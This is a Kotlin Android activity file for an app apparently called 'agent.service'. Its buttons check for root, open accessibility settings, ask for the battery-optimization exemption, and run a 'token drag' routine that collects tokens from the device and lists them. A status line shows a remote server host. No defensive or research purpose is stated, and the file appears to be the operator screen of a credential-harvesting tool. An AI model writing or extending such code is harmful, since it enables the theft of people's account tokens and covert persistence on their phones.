package com.agent.service

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.text.method.ScrollingMovementMethod
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : AppCompatActivity() {

    private lateinit var status: TextView
    private lateinit var log: TextView
    private val fmt = SimpleDateFormat("HH:mm:ss", Locale.US)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        status = findViewById(R.id.statusText)
        log = findViewById(R.id.logText)
        log.movementMethod = ScrollingMovementMethod()

        findViewById<Button>(R.id.btnRoot).setOnClickListener {
            lifecycleScope.launch {
                val ok = RootShell.available()
                appendLog("root check: ${if (ok) "granted" else "denied"}")
                refresh()
            }
        }

        findViewById<Button>(R.id.btnAccessibility).setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        findViewById<Button>(R.id.btnBattery).setOnClickListener {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    .setData(Uri.parse("package:$packageName")))
            } else appendLog("battery optimization already off")
        }

        findViewById<Button>(R.id.btnDrag).setOnClickListener {
            lifecycleScope.launch {
                appendLog("token drag starting...")
                val toks = TokenDragger.drag(applicationContext)
                appendLog("found ${toks.size} tokens")
                toks.forEach { appendLog("  [${it.kind}] ${it.token.take(40)}…") }
            }
        }

        refresh()
    }

    private fun refresh() {
        lifecycleScope.launch {
            val ok = RootShell.available()
            status.text = "root: ${if (ok) "yes" else "no"}   " +
                    "host: ${ApiClient.SERVER_URL}"
        }
    }

    private fun appendLog(line: String) {
        log.append("[${fmt.format(Date())}] $line\n")
        val scroll = (log.layout?.lineCount ?: 0) * log.lineHeight - log.height
        if (scroll > 0) log.scrollTo(0, scroll)
    }
}
